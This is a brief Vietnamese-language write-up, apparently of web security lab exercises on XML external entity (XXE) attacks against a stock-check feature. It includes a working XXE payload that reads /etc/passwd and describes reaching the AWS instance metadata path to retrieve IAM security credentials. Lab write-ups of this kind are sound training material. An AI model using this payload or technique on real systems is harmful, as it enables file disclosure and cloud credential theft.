![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)

Trong web có cái check stock dùng xml:

![image](https://github.com/user-attachments/assets/5d8bf9eb-857a-497a-8764-918e770534d9)

![image](https://github.com/user-attachments/assets/4befdeb1-bce8-42c9-9264-2c95f21b5e93)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lmao [ <!ENTITY lmao1 SYSTEM "file:///etc/passwd"> ]>

<stockCheck>
<productId>&lmao1;
</productId><storeId>2</storeId></stockCheck>
```

Tạo 1 cái ENTITY mở file /etc/passwd

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/3d647ea7-d282-493b-adf2-35668ea33d5c)

![image](https://github.com/user-attachments/assets/c865df3e-c259-4da1-9b57-01d8b7942010)

Lần này làm giống bài cũ nhưng không có được

![image](https://github.com/user-attachments/assets/eea7330a-df34-40ad-83f6-c94ce3f10446)

Tôi tra mạng thì ra được cái này [Retrieve security credentials from instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html):

![image](https://github.com/user-attachments/assets/50eb2ec6-2623-483c-ae7f-d10fb2c9a0bd)

Và tôi thêm cái latest/meta-data/iam/security-credentials/admin vào sau, nó ra:

![image](https://github.com/user-attachments/assets/7b1516ac-44b1-4709-b5a8-0f014b380a74)

Xong

<h1>---------------------------------------------------------</h1>
<br>













































































































